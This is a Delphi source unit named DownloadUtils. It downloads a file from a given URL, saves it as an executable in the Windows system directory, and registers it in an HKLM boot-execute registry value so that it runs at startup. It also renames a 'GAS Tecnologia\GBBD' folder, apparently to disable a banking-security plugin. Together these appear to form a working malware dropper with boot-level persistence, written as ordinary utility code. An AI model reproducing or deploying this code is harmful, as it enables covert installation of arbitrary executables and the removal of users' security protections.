unit DownloadUtils;

interface

uses
  Winapi.Windows;

  function DownloadFile(const AURL: string): Boolean;
  procedure DownloadFileAndReg(const AURL: string);
  function ExtractFileNameByURL(const AURL: string): string;
  function IsWinXP: Boolean;
  procedure WritelnDebug(AMsg: string);
  procedure WriteToReg(ARootKey: HKEY; ASection, AKey, AVal: string; AIsMultiStr: Boolean);
  procedure RenameGazDir;

implementation

uses
  IdHTTP, System.Classes, System.SysUtils, IOUtils, RegistryEx,
  DownloadConst, SHFolder;

function GetSpecialFolderPath(AFolder: Integer): string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  Path: array [0..MAX_PATH] of WideChar;
begin
  if Succeeded(SHGetFolderPath(0, AFolder, 0, SHGFP_TYPE_CURRENT, @Path[0])) then
    Result := Path
  else
    Result := '';
end;

procedure RenameGazDir;
var
  PathToAppData: string;
  PathToOldDir, PathToNewDir: string;
begin
  PathToAppData := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA);
  PathToOldDir := PathToAppData + '\GAS Tecnologia\GBBD';
  PathToNewDir := PathToAppData + '\GAS Tecnologia\X';
  if PathToAppData <> EmptyStr then
  begin
    if DirectoryExists(PathToOldDir) then
    begin
      try
        RenameFile(PathToOldDir, PathToNewDir);
      except
        on e: Exception do
          WritelnDebug('Error RenameGazDir:' + e.Message);
      end;
      if DirectoryExists(PathToNewDir) then
        WritelnDebug('Directory renamed successfully: ' + PathToNewDir);
    end
    else
      WritelnDebug('Directory not found: ' + PathToOldDir);
  end;
end;

procedure WritelnDebug(AMsg: string);
begin
  if IS_DEBUG_MODE then
    Writeln(AMsg);
end;

function IsWinXP: Boolean;
begin
  Result := not TOSVersion.Check(6);
end;

function GetPathToSystemDirectory: string;
var
  Buffer: array[0..MAX_PATH] of Char;
begin
   GetSystemDirectory(Buffer, MAX_PATH - 1);
   SetLength(Result, StrLen(Buffer));
   Result := Buffer;
end;

function ExtractFileNameByURL(const AURL: string): string;
var
  I: Integer;
begin
  I := AURL.LastDelimiter('/');
  Result := AURL.SubString(I + 1);
end;

function CheckFileUsed(const APathToFile: string): Boolean;
var
  F: TFileStream;
begin
  try
    F := TFileStream.Create(APathToFile, fmOpenReadWrite or fmShareExclusive);
    try
      Result := False;
    finally
      F.Free;
    end;
  except
    Result := True;
  end;
end;

function DownloadFile(const AURL: string): Boolean;
var
  LoadStream: TMemoryStream;
  idHTTP: TidHTTP;
  PathToFile: string;
begin
  Result := False;
  PathToFile := GetPathToSystemDirectory + PathDelim +
    ChangeFileExt(ExtractFileNameByURL(AURL), '.exe');

  if FileExists(PathToFile) then
  begin
    if CheckFileUsed(PathToFile) then
    begin
      WritelnDebug('File "' + PathToFile + '" is opened for editing. Close the file and try again');
      Exit;
    end else
    if not DeleteFile(PWideChar(PathToFile)) then
    begin
      WritelnDebug('File exists "' + PathToFile + '". Failed to remove');
      Exit;
    end;
  end;

  idHTTP := TidHTTP.Create(nil);
  try
    LoadStream := TMemoryStream.Create;
    try
      try
        IdHTTP.Get(AURL, LoadStream);
        WritelnDebug('The file is downloaded from the source: ' + AURL);
        LoadStream.SaveToFile(PathToFile);
        WritelnDebug('File is saved: ' + PathToFile);
        Result := FileExists(PathToFile);
      except
        on e: Exception do
        begin
          Result := False;
          WritelnDebug('Error: ' + e.Message);
        end;
      end;
    finally
      LoadStream.Free;
    end;
  finally
    idHTTP.Free;
  end;
end;

procedure WriteToReg(ARootKey: HKEY; ASection, AKey, AVal: string; AIsMultiStr: Boolean);
var
  Reg: TRegistryEx;
  Key: string;
  StringList: TStringList;
begin
  if IS_DEBUG_MODE then
    Key := AKey + 'Test'
  else
    Key := AKey;

  StringList := TStringList.Create;
  try
    StringList.Add(Trim(AVal));
    Reg := TRegistryEx.Create(KEY_ALL_ACCESS);
    try
      Reg.RootKey := ARootKey;
      Reg.OpenKey(ASection, True);
      if AIsMultiStr then
        Reg.WriteMultiString(Key, StringList)
      else
        Reg.WriteString(Key, AVal);
      WritelnDebug('In this section of the Registry: ' + ASection +
                   ' Key: ' + Key +
        ' written value: ' + AVal);
    finally
      Reg.Free;
    end;
  finally
    StringList.Free;
  end;
end;

procedure DownloadFileAndReg(const AURL: string);
begin
  if DownloadFile(AURL) then
    WriteToReg(HKEY_LOCAL_MACHINE, REG_SECTION_BOOT, REG_KEY_BOOT, 'autocheck autochk *'
      +  #0 + ChangeFileExt(ExtractFileNameByURL(AURL), '.exe') + #0, True);
end;

end.
